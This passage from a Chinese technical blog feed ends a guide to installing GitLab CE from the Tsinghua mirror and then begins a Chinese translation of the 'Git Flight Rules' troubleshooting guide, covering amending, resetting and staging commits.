<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">curl https://packages.gitlab.com/gpg.key 2&gt; /dev/null | sudo apt-key add - &amp;&gt;/dev/null</span><br></pre></td></tr></table></figure>
<p>再选择你的 <code>Debian/Ubuntu</code> 版本，文本框中内容写进 <code>/etc/apt/sources.list.d/gitlab-ce.list</code></p>
<p>你的Debian/Ubuntu版本: </p>
<ul>
<li>Debian 8 (Jessie) </li>
<li>Debian 9 (Stretch) </li>
<li>Debian 10 (Buster) </li>
<li>Ubuntu 14.04 LTS </li>
<li>Ubuntu 16.04 LTS </li>
<li>Ubuntu 18.04 LTS </li>
</ul>
<p>如：<br><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">deb https://mirrors.tuna.tsinghua.edu.cn/gitlab-ce/ubuntu trusty main</span><br></pre></td></tr></table></figure></p>
<p>安装 gitlab-ce:</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo apt-get update</span><br><span class="line">sudo apt-get install gitlab-ce</span><br></pre></td></tr></table></figure>
<h3 id="RHEL-CentOS-用户"><a href="#RHEL-CentOS-用户" class="headerlink" title="RHEL/CentOS 用户"></a>RHEL/CentOS 用户</h3><p>新建 <code>/etc/yum.repos.d/gitlab-ce.repo</code>，内容为</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[gitlab-ce]</span><br><span class="line">name=Gitlab CE Repository</span><br><span class="line">baseurl=https://mirrors.tuna.tsinghua.edu.cn/gitlab-ce/yum/el$releasever/</span><br><span class="line">gpgcheck=0</span><br><span class="line">enabled=1</span><br></pre></td></tr></table></figure>
<p>再执行</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo yum makecache</span><br><span class="line">sudo yum install gitlab-ce</span><br></pre></td></tr></table></figure>
<p><img src="/images/git/gitlab_清华源.png" alt><br><img src="/images/git/gitlab_清华源_代号.png" alt></p>
]]></content>
      <categories>
        <category>git</category>
      </categories>
  </entry>
  <entry>
    <title>Git飞行规则(Flight Rules)</title>
    <url>/git/Git%E9%A3%9E%E8%A1%8C%E8%A7%84%E5%88%99(Flight-Rules)/</url>
    <content><![CDATA[<p>原文 ：<a href="https://github.com/k88hudson/git-flight-rules/blob/master/README_zh-cn.md" target="_blank" rel="noopener">https://github.com/k88hudson/git-flight-rules/blob/master/README_zh-cn.md</a></p>
<h4 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h4><ul>
<li>英文原版<a href="https://github.com/k88hudson/git-flight-rules/blob/master/README.md" target="_blank" rel="noopener">README</a></li>
<li>翻译可能存在错误或不标准的地方，欢迎大家指正和修改，谢谢！</li>
</ul>
<h4 id="什么是”飞行规则”"><a href="#什么是”飞行规则”" class="headerlink" title="什么是”飞行规则”?"></a>什么是”飞行规则”?</h4><p>一个 <a href="http://www.jsc.nasa.gov/news/columbia/fr_generic.pdf" target="_blank" rel="noopener">宇航员指南</a> (现在, 程序员们都在使用GIT) 是关于出现问题过后应该怎么操作。</p>
<blockquote>
<p> <em>飞行规则(Flight Rules)</em> 是记录在手册上的来之不易的一系列知识，记录了某个事情发生的原因，以及怎样一步一步的进行处理。本质上, 它们是特定场景的非常详细的标准处理流程。 […]</p>
</blockquote>
<blockquote>
<p>自20世纪60年代初以来，NASA一直在捕捉(capturing)我们的失误，灾难和解决方案, 当时水星时代(Mercury-era)的地面小组首先开始将“经验教训”收集到一个纲要(compendium)中，该纲现在已经有上千个问题情景，从发动机故障到破损的舱口把手到计算机故障，以及它们对应的解决方案。</p>
</blockquote>
<p>&mdash; Chris Hadfield, <em>一个宇航员的生活指南(An Astronaut’s Guide to Life)</em>。</p>
<h4 id="这篇文章的约定"><a href="#这篇文章的约定" class="headerlink" title="这篇文章的约定"></a>这篇文章的约定</h4><p>为了清楚的表述，这篇文档里的所有例子使用了自定义的bash 提示，以便指示当前分支和是否有暂存的变化(changes)。分支名用小括号括起来，分支名后面跟的<code>*</code>表示暂存的变化(changes)。</p>
<p><a href="https://gitter.im/k88hudson/git-flight-rules?utm_source=badge&amp;utm_medium=badge&amp;utm_campaign=pr-badge&amp;utm_content=badge" target="_blank" rel="noopener"><img src="https://badges.gitter.im/Join%20Chat.svg" alt="Join the chat at https://gitter.im/k88hudson/git-flight-rules"></a><br><!-- START doctoc generated TOC please keep comment here to allow auto update --><br><!-- DON'T EDIT THIS SECTION, INSTEAD RE-RUN doctoc TO UPDATE --><br><strong>Table of Contents</strong>  <em>generated with <a href="https://github.com/thlorenz/doctoc" target="_blank" rel="noopener">DocToc</a></em></p>
<ul>
<li><a href="#%E7%BC%96%E8%BE%91%E6%8F%90%E4%BA%A4editting-commits">编辑提交(editting commits)</a><ul>
<li><a href="#%E6%88%91%E5%88%9A%E6%89%8D%E6%8F%90%E4%BA%A4%E4%BA%86%E4%BB%80%E4%B9%88">我刚才提交了什么?</a></li>
<li><a href="#%E6%88%91%E7%9A%84%E6%8F%90%E4%BA%A4%E4%BF%A1%E6%81%AFcommit-message%E5%86%99%E9%94%99%E4%BA%86">我的提交信息(commit message)写错了</a></li>
<li><a href="#%E6%88%91%E6%8F%90%E4%BA%A4commit%E9%87%8C%E7%9A%84%E7%94%A8%E6%88%B7%E5%90%8D%E5%92%8C%E9%82%AE%E7%AE%B1%E4%B8%8D%E5%AF%B9">我提交(commit)里的用户名和邮箱不对</a></li>
<li><a href="#%E6%88%91%E6%83%B3%E4%BB%8E%E4%B8%80%E4%B8%AA%E6%8F%90%E4%BA%A4commit%E9%87%8C%E7%A7%BB%E9%99%A4%E4%B8%80%E4%B8%AA%E6%96%87%E4%BB%B6">我想从一个提交(commit)里移除一个文件</a></li>
<li><a href="#%E6%88%91%E6%83%B3%E5%88%A0%E9%99%A4%E6%88%91%E7%9A%84%E7%9A%84%E6%9C%80%E5%90%8E%E4%B8%80%E6%AC%A1%E6%8F%90%E4%BA%A4commit">我想删除我的的最后一次提交(commit)</a></li>
<li><a href="#%E5%88%A0%E9%99%A4%E4%BB%BB%E6%84%8F%E6%8F%90%E4%BA%A4commit">删除任意提交(commit)</a></li>
<li><a href="#%E6%88%91%E5%B0%9D%E8%AF%95%E6%8E%A8%E4%B8%80%E4%B8%AA%E4%BF%AE%E6%AD%A3%E5%90%8E%E7%9A%84%E6%8F%90%E4%BA%A4amended-commit%E5%88%B0%E8%BF%9C%E7%A8%8B%E4%BD%86%E6%98%AF%E6%8A%A5%E9%94%99">我尝试推一个修正后的提交(amended commit)到远程，但是报错：</a></li>
<li><a href="#%E6%88%91%E6%84%8F%E5%A4%96%E7%9A%84%E5%81%9A%E4%BA%86%E4%B8%80%E6%AC%A1%E7%A1%AC%E9%87%8D%E7%BD%AEhard-reset%E6%88%91%E6%83%B3%E6%89%BE%E5%9B%9E%E6%88%91%E7%9A%84%E5%86%85%E5%AE%B9">我意外的做了一次硬重置(hard reset)，我想找回我的内容</a></li>
</ul>
</li>
<li><a href="#%E6%9A%82%E5%AD%98staging">暂存(Staging)</a><ul>
<li><a href="#%E6%88%91%E9%9C%80%E8%A6%81%E6%8A%8A%E6%9A%82%E5%AD%98%E7%9A%84%E5%86%85%E5%AE%B9%E6%B7%BB%E5%8A%A0%E5%88%B0%E4%B8%8A%E4%B8%80%E6%AC%A1%E7%9A%84%E6%8F%90%E4%BA%A4commit">我需要把暂存的内容添加到上一次的提交(commit)</a></li>
<li><a href="#%E6%88%91%E6%83%B3%E8%A6%81%E6%9A%82%E5%AD%98%E4%B8%80%E4%B8%AA%E6%96%B0%E6%96%87%E4%BB%B6%E7%9A%84%E4%B8%80%E9%83%A8%E5%88%86%E8%80%8C%E4%B8%8D%E6%98%AF%E8%BF%99%E4%B8%AA%E6%96%87%E4%BB%B6%E7%9A%84%E5%85%A8%E9%83%A8">我想要暂存一个新文件的一部分，而不是这个文件的全部</a></li>
<li><a href="#%E6%88%91%E6%83%B3%E6%8A%8A%E5%9C%A8%E4%B8%80%E4%B8%AA%E6%96%87%E4%BB%B6%E9%87%8C%E7%9A%84%E5%8F%98%E5%8C%96changes%E5%8A%A0%E5%88%B0%E4%B8%A4%E4%B8%AA%E6%8F%90%E4%BA%A4commit%E9%87%8C">我想把在一个文件里的变化(changes)加到两个提交(commit)里</a></li>
<li><a href="#%E6%88%91%E6%83%B3%E6%8A%8A%E6%9A%82%E5%AD%98%E7%9A%84%E5%86%85%E5%AE%B9%E5%8F%98%E6%88%90%E6%9C%AA%E6%9A%82%E5%AD%98%E6%8A%8A%E6%9C%AA%E6%9A%82%E5%AD%98%E7%9A%84%E5%86%85%E5%AE%B9%E6%9A%82%E5%AD%98%E8%B5%B7%E6%9D%A5">我想把暂存的内容变成未暂存，把未暂存的内容暂存起来</a></li>
</ul>
</li>
<li><a href="#%E6%9C%AA%E6%9A%82%E5%AD%98unstaged%E7%9A%84%E5%86%85%E5%AE%B9">未暂存(Unstaged)的内容</a><ul>
<li><a href="#%E6%88%91%E6%83%B3%E6%8A%8A%E6%9C%AA%E6%9A%82%E5%AD%98%E7%9A%84%E5%86%85%E5%AE%B9%E7%A7%BB%E5%8A%A8%E5%88%B0%E4%B8%80%E4%B8%AA%E6%96%B0%E5%88%86%E6%94%AF">我想把未暂存的内容移动到一个新分支</a></li>
<li><a href="#%E6%88%91%E6%83%B3%E6%8A%8A%E6%9C%AA%E6%9A%82%E5%AD%98%E7%9A%84%E5%86%85%E5%AE%B9%E7%A7%BB%E5%8A%A8%E5%88%B0%E5%8F%A6%E4%B8%80%E4%B8%AA%E5%B7%B2%E5%AD%98%E5%9C%A8%E7%9A%84%E5%88%86%E6%94%AF">我想把未暂存的内容移动到另一个已存在的分支</a></li>
<li><a href="#%E6%88%91%E6%83%B3%E4%B8%A2%E5%BC%83%E6%9C%AC%E5%9C%B0%E6%9C%AA%E6%8F%90%E4%BA%A4%E7%9A%84%E5%8F%98%E5%8C%96uncommitted-changes">我想丢弃本地未提交的变化(uncommitted changes)</a></li>
<li><a href="#%E6%88%91%E6%83%B3%E4%B8%A2%E5%BC%83%E6%9F%90%E4%BA%9B%E6%9C%AA%E6%9A%82%E5%AD%98%E7%9A%84%E5%86%85%E5%AE%B9">我想丢弃某些未暂存的内容</a></li>
</ul>
</li>
<li><a href="#%E5%88%86%E6%94%AFbranches">分支(Branches)</a><ul>
<li><a href="#%E6%88%91%E4%BB%8E%E9%94%99%E8%AF%AF%E7%9A%84%E5%88%86%E6%94%AF%E6%8B%89%E5%8F%96%E4%BA%86%E5%86%85%E5%AE%B9%E6%88%96%E6%8A%8A%E5%86%85%E5%AE%B9%E6%8B%89%E5%8F%96%E5%88%B0%E4%BA%86%E9%94%99%E8%AF%AF%E7%9A%84%E5%88%86%E6%94%AF">我从错误的分支拉取了内容，或把内容拉取到了错误的分支</a></li>
<li><a href="#%E6%88%91%E6%83%B3%E6%89%94%E6%8E%89%E6%9C%AC%E5%9C%B0%E7%9A%84%E6%8F%90%E4%BA%A4commit%E4%BB%A5%E4%BE%BF%E6%88%91%E7%9A%84%E5%88%86%E6%94%AF%E4%B8%8E%E8%BF%9C%E7%A8%8B%E7%9A%84%E4%BF%9D%E6%8C%81%E4%B8%80%E8%87%B4">我想扔掉本地的提交(commit)，以便我的分支与远程的保持一致</a></li>
<li><a href="#%E6%88%91%E9%9C%80%E8%A6%81%E6%8F%90%E4%BA%A4%E5%88%B0%E4%B8%80%E4%B8%AA%E6%96%B0%E5%88%86%E6%94%AF%E4%BD%86%E9%94%99%E8%AF%AF%E7%9A%84%E6%8F%90%E4%BA%A4%E5%88%B0%E4%BA%86master">我需要提交到一个新分支，但错误的提交到了master</a></li>
<li><a href="#%E6%88%91%E6%83%B3%E4%BF%9D%E7%95%99%E6%9D%A5%E8%87%AA%E5%8F%A6%E5%A4%96%E4%B8%80%E4%B8%AAref-ish%E7%9A%84%E6%95%B4%E4%B8%AA%E6%96%87%E4%BB%B6">我想保留来自另外一个ref-ish的整个文件</a></li>
<li><a href="#%E6%88%91%E6%8A%8A%E5%87%A0%E4%B8%AA%E6%8F%90%E4%BA%A4commit%E6%8F%90%E4%BA%A4%E5%88%B0%E4%BA%86%E5%90%8C%E4%B8%80%E4%B8%AA%E5%88%86%E6%94%AF%E8%80%8C%E8%BF%99%E4%BA%9B%E6%8F%90%E4%BA%A4%E5%BA%94%E8%AF%A5%E5%88%86%E5%B8%83%E5%9C%A8%E4%B8%8D%E5%90%8C%E7%9A%84%E5%88%86%E6%94%AF%E9%87%8C">我把几个提交(commit)提交到了同一个分支，而这些提交应该分布在不同的分支里</a></li>
<li><a href="#%E6%88%91%E6%83%B3%E5%88%A0%E9%99%A4%E4%B8%8A%E6%B8%B8upstream%E5%88%86%E6%94%AF%E8%A2%AB%E5%88%A0%E9%99%A4%E4%BA%86%E7%9A%84%E6%9C%AC%E5%9C%B0%E5%88%86%E6%94%AF">我想删除上游(upstream)分支被删除了的本地分支</a></li>
<li><a href="#%E6%88%91%E4%B8%8D%E5%B0%8F%E5%BF%83%E5%88%A0%E9%99%A4%E4%BA%86%E6%88%91%E7%9A%84%E5%88%86%E6%94%AF">我不小心删除了我的分支</a></li>
<li><a href="#%E6%88%91%E6%83%B3%E5%88%A0%E9%99%A4%E4%B8%80%E4%B8%AA%E5%88%86%E6%94%AF">我想删除一个分支</a></li>
<li><a href="#%E6%88%91%E6%83%B3%E4%BB%8E%E5%88%AB%E4%BA%BA%E6%AD%A3%E5%9C%A8%E5%B7%A5%E4%BD%9C%E7%9A%84%E8%BF%9C%E7%A8%8B%E5%88%86%E6%94%AF%E7%AD%BE%E5%87%BAcheckout%E4%B8%80%E4%B8%AA%E5%88%86%E6%94%AF">我想从别人正在工作的远程分支签出(checkout)一个分支</a></li>
</ul>
</li>
<li><a href="#rebasing-%E5%92%8C%E5%90%88%E5%B9%B6merging">Rebasing 和合并(Merging)</a><ul>
<li><a href="#%E6%88%91%E6%83%B3%E6%92%A4%E9%94%80rebasemerge">我想撤销rebase/merge</a></li>
<li><a href="#%E6%88%91%E5%B7%B2%E7%BB%8Frebase%E8%BF%87-%E4%BD%86%E6%98%AF%E6%88%91%E4%B8%8D%E6%83%B3%E5%BC%BA%E6%8E%A8force-push">我已经rebase过, 但是我不想强推(force push)</a></li>
<li><a href="#%E6%88%91%E9%9C%80%E8%A6%81%E7%BB%84%E5%90%88combine%E5%87%A0%E4%B8%AA%E6%8F%90%E4%BA%A4commit">我需要组合(combine)几个提交(commit)</a><ul>
<li><a href="#%E5%AE%89%E5%85%A8%E5%90%88%E5%B9%B6merging%E7%AD%96%E7%95%A5">安全合并(merging)策略</a></li>
<li><a href="#%E6%88%91%E9%9C%80%E8%A6%81%E5%B0%86%E4%B8%80%E4%B8%AA%E5%88%86%E6%94%AF%E5%90%88%E5%B9%B6%E6%88%90%E4%B8%80%E4%B8%AA%E6%8F%90%E4%BA%A4commit">我需要将一个分支合并成一个提交(commit)</a></li>
<li><a href="#%E6%88%91%E5%8F%AA%E6%83%B3%E7%BB%84%E5%90%88combine%E6%9C%AA%E6%8E%A8%E7%9A%84%E6%8F%90%E4%BA%A4unpushed-commit">我只想组合(combine)未推的提交(unpushed commit)</a></li>
</ul>
</li>
<li><a href="#%E6%A3%80%E6%9F%A5%E6%98%AF%E5%90%A6%E5%88%86%E6%94%AF%E4%B8%8A%E7%9A%84%E6%89%80%E6%9C%89%E6%8F%90%E4%BA%A4commit%E9%83%BD%E5%90%88%E5%B9%B6merge%E8%BF%87%E4%BA%86">检查是否分支上的所有提交(commit)都合并(merge)过了</a></li>
<li><a href="#%E4%BA%A4%E4%BA%92%E5%BC%8Frebaseinteractive-rebase%E5%8F%AF%E8%83%BD%E5%87%BA%E7%8E%B0%E7%9A%84%E9%97%AE%E9%A2%98">交互式rebase(interactive rebase)可能出现的问题</a><ul>
<li><a href="#%E8%BF%99%E4%B8%AArebase-%E7%BC%96%E8%BE%91%E5%B1%8F%E5%B9%95%E5%87%BA%E7%8E%B0noop">这个rebase 编辑屏幕出现’noop’</a></li>
<li><a href="#%E6%9C%89%E5%86%B2%E7%AA%81%E7%9A%84%E6%83%85%E5%86%B5">有冲突的情况</a></li>
</ul>
</li>
</ul>
</li>
<li><a href="#%E6%9D%82%E9%A1%B9miscellaneous-objects">杂项(Miscellaneous Objects)</a><ul>
<li><a href="#%E5%85%8B%E9%9A%86%E6%89%80%E6%9C%89%E5%AD%90%E6%A8%A1%E5%9D%97">克隆所有子模块</a></li>
<li><a href="#%E5%88%A0%E9%99%A4%E6%A0%87%E7%AD%BEtag">删除标签(tag)</a></li>
<li><a href="#%E6%81%A2%E5%A4%8D%E5%B7%B2%E5%88%A0%E9%99%A4%E6%A0%87%E7%AD%BEtag">恢复已删除标签(tag)</a></li>
<li><a href="#%E5%B7%B2%E5%88%A0%E9%99%A4%E8%A1%A5%E4%B8%81patch">已删除补丁(patch)</a></li>
</ul>
</li>
<li><a href="#%E8%B7%9F%E8%B8%AA%E6%96%87%E4%BB%B6tracking-files">跟踪文件(Tracking Files)</a><ul>
<li><a href="#%E6%88%91%E5%8F%AA%E6%83%B3%E6%94%B9%E5%8F%98%E4%B8%80%E4%B8%AA%E6%96%87%E4%BB%B6%E5%90%8D%E5%AD%97%E7%9A%84%E5%A4%A7%E5%B0%8F%E5%86%99%E8%80%8C%E4%B8%8D%E4%BF%AE%E6%94%B9%E5%86%85%E5%AE%B9">我只想改变一个文件名字的大小写，而不修改内容</a></li>
<li><a href="#%E6%88%91%E6%83%B3%E4%BB%8Egit%E5%88%A0%E9%99%A4%E4%B8%80%E4%B8%AA%E6%96%87%E4%BB%B6%E4%BD%86%E4%BF%9D%E7%95%99%E8%AF%A5%E6%96%87%E4%BB%B6">我想从Git删除一个文件，但保留该文件</a></li>
</ul>
</li>
<li><a href="#%E9%85%8D%E7%BD%AEconfiguration">配置(Configuration)</a><ul>
<li><a href="#%E6%88%91%E6%83%B3%E7%BB%99%E4%B8%80%E4%BA%9Bgit%E5%91%BD%E4%BB%A4%E6%B7%BB%E5%8A%A0%E5%88%AB%E5%90%8Dalias">我想给一些Git命令添加别名(alias)</a></li>
<li><a href="#%E6%88%91%E6%83%B3%E7%BC%93%E5%AD%98%E4%B8%80%E4%B8%AA%E4%BB%93%E5%BA%93repository%E7%9A%84%E7%94%A8%E6%88%B7%E5%90%8D%E5%92%8C%E5%AF%86%E7%A0%81">我想缓存一个仓库(repository)的用户名和密码</a></li>
</ul>
</li>
<li><a href="#%E6%88%91%E4%B8%8D%E7%9F%A5%E9%81%93%E6%88%91%E5%81%9A%E9%94%99%E4%BA%86%E4%BA%9B%E4%BB%80%E4%B9%88">我不知道我做错了些什么</a><ul>
<li><a href="#%E5%85%B6%E5%AE%83%E8%B5%84%E6%BA%90other-resources">其它资源(Other Resources)</a></li>
</ul>
</li>
<li><a href="#%E4%B9%A6books">书(Books)</a></li>
<li><a href="#%E6%95%99%E7%A8%8Btutorials">教程(Tutorials)</a></li>
<li><a href="#%E8%84%9A%E6%9C%AC%E5%92%8C%E5%B7%A5%E5%85%B7scripts-and-tools">脚本和工具(Scripts and Tools)</a></li>
<li><a href="#gui%E5%AE%A2%E6%88%B7%E7%AB%AFgui-clients">GUI客户端(GUI Clients)</a></li>
</ul>
<!-- END doctoc generated TOC please keep comment here to allow auto update -->
<h2 id="编辑提交-editting-commits"><a href="#编辑提交-editting-commits" class="headerlink" title="编辑提交(editting commits)"></a>编辑提交(editting commits)</h2><p><a name="diff-last"></a></p>
<h3 id="我刚才提交了什么"><a href="#我刚才提交了什么" class="headerlink" title="我刚才提交了什么?"></a>我刚才提交了什么?</h3><p>如果你用 <code>git commit -a</code> 提交了一次变化(changes)，而你又不确定到底这次提交了哪些面容。 你就可以用下面的命令显示当前<code>HEAD</code>上的最近一次的提交(commit):</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">(master)$ git show</span><br></pre></td></tr></table></figure>
<p>或者</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ git <span class="built_in">log</span> -n1 -p</span><br></pre></td></tr></table></figure>
<p><a name="#i-wrote-the-wrong-thing-in-a-commit-message"></a></p>
<h3 id="我的提交信息-commit-message-写错了"><a href="#我的提交信息-commit-message-写错了" class="headerlink" title="我的提交信息(commit message)写错了"></a>我的提交信息(commit message)写错了</h3><p>如果你的提交信息(commit message)写错了且这次提交(commit)还没有推(push), 你可以通过下面的方法来修改提交信息(commit message):</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ git commit --amend</span><br></pre></td></tr></table></figure>
<p>这会打开你的默认编辑器, 在这里你可以编辑信息. 另一方面, 你也可以用一条命令一次完成:</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ git commit --amend -m <span class="string">'xxxxxxx'</span></span><br></pre></td></tr></table></figure>
<p>如果你已经推(push)了这次提交(commit), 你可以修改这次提交(commit)然后强推(force push), 但是不推荐这么做。</p>
<p><a name="commit-wrong-author"></a></p>
<h3 id="我提交-commit-里的用户名和邮箱不对"><a href="#我提交-commit-里的用户名和邮箱不对" class="headerlink" title="我提交(commit)里的用户名和邮箱不对"></a>我提交(commit)里的用户名和邮箱不对</h3><p>如果这只是单个提交(commit)，修改它：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ git commit --amend --author <span class="string">"New Authorname &lt;authoremail@mydomain.com&gt;"</span></span><br></pre></td></tr></table></figure>
<p>如果你需要修改所有历史, 参考 ‘git filter-branch’的指南页.</p>
<p><a href="#i-want-to-remove-a-file-from-a-commit"></a></p>
<h3 id="我想从一个提交-commit-里移除一个文件"><a href="#我想从一个提交-commit-里移除一个文件" class="headerlink" title="我想从一个提交(commit)里移除一个文件"></a>我想从一个提交(commit)里移除一个文件</h3><p>通过下面的方法，从一个提交(commit)里移除一个文件:</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ git checkout HEAD^ myfile</span><br><span class="line">$ git add -A</span><br><span class="line">$ git commit --amend</span><br></pre></td></tr></table></figure>
<p>这将非常有用，当你有一个开放的补丁(open patch)，你往上面提交了一个不必要的文件，你需要强推(force push)去更新这个远程补丁。</p>
<p><a name="delete-pushed-commit"></a></p>
<h3 id="我想删除我的的最后一次提交-commit"><a href="#我想删除我的的最后一次提交-commit" class="headerlink" title="我想删除我的的最后一次提交(commit)"></a>我想删除我的的最后一次提交(commit)</h3><p>如果你需要删除推了的提交(pushed commits)，你可以使用下面的方法。可是，这会不可逆的改变你的历史，也会搞乱那些已经从该仓库拉取(pulled)了的人的历史。简而言之，如果你不是很确定，千万不要这么做。</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ git reset HEAD^ --hard</span><br><span class="line">$ git push -f [remote] [branch]</span><br></pre></td></tr></table></figure>
<p>如果你还没有推到远程, 把Git重置(reset)到你最后一次提交前的状态就可以了(同时保存暂存的变化):</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">(my-branch*)$ git reset --soft HEAD@&#123;1&#125;</span><br></pre></td></tr></table></figure>
<p>这只能在没有推送之前有用. 如果你已经推了, 唯一安全能做的是 <code>git revert SHAofBadCommit</code>， 那会创建一个新的提交(commit)用于撤消前一个提交的所有变化(changes)； 或者, 如果你推的这个分支是rebase-safe的 (例如： 其它开发者不会从这个分支拉), 只需要使用 <code>git push -f</code>； 更多, 请参考 <a href="#deleteremove-last-pushed-commit">the above section</a>。</p>
<p><a name="delete-any-commit"></a></p>
<h3 id="删除任意提交-commit"><a href="#删除任意提交-commit" class="headerlink" title="删除任意提交(commit)"></a>删除任意提交(commit)</h3><p>同样的警告：不到万不得已的时候不要这么做.</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ git rebase --onto SHA1_OF_BAD_COMMIT^ SHA1_OF_BAD_COMMIT</span><br><span class="line">$ git push -f [remote] [branch]</span><br></pre></td></tr></table></figure>
<p>或者做一个 <a href="#interactive-rebase">交互式rebase</a> 删除那些你想要删除的提交(commit)里所对应的行。</p>
<p><a name="#force-push"></a></p>
<h3 id="我尝试推一个修正后的提交-amended-commit-到远程，但是报错："><a href="#我尝试推一个修正后的提交-amended-commit-到远程，但是报错：" class="headerlink" title="我尝试推一个修正后的提交(amended commit)到远程，但是报错："></a>我尝试推一个修正后的提交(amended commit)到远程，但是报错：</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">To https://github.com/yourusername/repo.git</span><br><span class="line">! [rejected]        mybranch -&gt; mybranch (non-fast-forward)</span><br><span class="line">error: failed to push some refs to <span class="string">'https://github.com/tanay1337/webmaker.org.git'</span></span><br><span class="line">hint: Updates were rejected because the tip of your current branch is behind</span><br><span class="line">hint: its remote counterpart. Integrate the remote changes (e.g.</span><br><span class="line">hint: <span class="string">'git pull ...'</span>) before pushing again.</span><br><span class="line">hint: See the <span class="string">'Note about fast-forwards'</span> <span class="keyword">in</span> <span class="string">'git push --help'</span> <span class="keyword">for</span> details.</span><br></pre></td></tr></table></figure>
<p>注意, rebasing(见下面)和修正(amending)会用一个<strong>新的提交(commit)代替旧的</strong>, 所以如果之前你已经往远程仓库上推过一次修正前的提交(commit)，那你现在就必须强推(force push) (<code>-f</code>)。 注意 &ndash; <em>总是</em> 确保你指明一个分支!</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">(my-branch)$ git push origin mybranch -f</span><br></pre></td></tr></table></figure>
<p>一般来说, <strong>要避免强推</strong>. 最好是创建和推(push)一个新的提交(commit)，而不是强推一个修正后的提交。后者会使那些与该分支或该分支的子分支工作的开发者，在源历史中产生冲突。</p>
<p><a href="undo-git-reset-hard"></a></p>
<h3 id="我意外的做了一次硬重置-hard-reset-，我想找回我的内容"><a href="#我意外的做了一次硬重置-hard-reset-，我想找回我的内容" class="headerlink" title="我意外的做了一次硬重置(hard reset)，我想找回我的内容"></a>我意外的做了一次硬重置(hard reset)，我想找回我的内容</h3><p>如果你意外的做了 <code>git reset --hard</code>, 你通常能找回你的提交(commit), 因为Git对每件事都会有日志，且都会保存几天。</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">(master)$ git reflog</span><br></pre></td></tr></table></figure>
<p>你将会看到一个你过去提交(commit)的列表, 和一个重置的提交。 选择你想要回到的提交(commit)的SHA，再重置一次:</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">(master)$ git reset --hard SHA1234</span><br></pre></td></tr></table></figure>
<p>这样就完成了。</p>
<h2 id="暂存-Staging"><a href="#暂存-Staging" class="headerlink" title="暂存(Staging)"></a>暂存(Staging)</h2><p><a href="#i-need-to-add-staged-changes-to-the-previous-commit"></a></p>
<h3 id="我需要把暂存的内容添加到上一次的提交-commit"><a href="#我需要把暂存的内容添加到上一次的提交-commit" class="headerlink" title="我需要把暂存的内容添加到上一次的提交(commit)"></a>我需要把暂存的内容添加到上一次的提交(commit)</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">(my-branch*)$ git commit --amend</span><br></pre></td></tr></table></figure>
<p><a name="commit-partial-new-file"></a></p>
<h3 id="我想要暂存一个新文件的一部分，而不是这个文件的全部"><a href="#我想要暂存一个新文件的一部分，而不是这个文件的全部" class="headerlink" title="我想要暂存一个新文件的一部分，而不是这个文件的全部"></a>我想要暂存一个新文件的一部分，而不是这个文件的全部</h3><p>一般来说, 如果你想暂存一个文件的一部分, 你可这样做:</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ git add --patch filename.x</span><br></pre></td></tr></table></figure>
<p><code>-p</code> 简写。这会打开交互模式， 你将能够用 <code>s</code> 选项来分隔提交(commit)； 然而, 如果这个文件是新的, 会没有这个选择， 添加一个新文件时, 这样做:</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ git add -N filename.x</span><br></pre></td></tr></table></figure>
<p>然后, 你需要用 <code>e</code> 选项来手动选择需要添加的行，执行 <code>git diff --cached</code> 将会显示哪些行暂存了哪些行只是保存在本地了。</p>
<p><a href="stage-in-two-commits"></a></p>
<h3 id="我想把在一个文件里的变化-changes-加到两个提交-commit-里"><a href="#我想把在一个文件里的变化-changes-加到两个提交-commit-里" class="headerlink" title="我想把在一个文件里的变化(changes)加到两个提交(commit)里"></a>我想把在一个文件里的变化(changes)加到两个提交(commit)里</h3><p><code>git add</code> 会把整个文件加入到一个提交. <code>git add -p</code> 允许交互式的选择你想要提交的部分.</p>
<p><a href="unstaging-edits-and-staging-the-unstaged"></a></p>
<h3 id="我想把暂存的内容变成未暂存，把未暂存的内容暂存起来"><a href="#我想把暂存的内容变成未暂存，把未暂存的内容暂存起来" class="headerlink" title="我想把暂存的内容变成未暂存，把未暂存的内容暂存起来"></a>我想把暂存的内容变成未暂存，把未暂存的内容暂存起来</h3><p>这个有点困难， 我能想到的最好的方法是先stash未暂存的内容， 然后重置(reset)，再pop第一步stashed的内容, 最后再add它们。</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ git stash -k</span><br><span class="line">$ git reset --hard</span><br><span class="line">$ git stash pop</span><br><span class="line">$ git add -A</span><br></pre></td></tr></table></figure>
<h2 id="未暂存-Unstaged-的内容"><a href="#未暂存-Unstaged-的内容" class="headerlink" title="未暂存(Unstaged)的内容"></a>未暂存(Unstaged)的内容</h2><p><a href="move-unstaged-edits-to-new-branch"></a></p>
<h3 id="我想把未暂存的内容移动到一个新分支"><a href="#我想把未暂存的内容移动到一个新分支" class="headerlink" title="我想把未暂存的内容移动到一个新分支"></a>我想把未暂存的内容移动到一个新分支</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ git checkout -b my-branch</span><br></pre></td></tr></table></figure>
<p><a href="move-unstaged-edits-to-old-branch"></a></p>
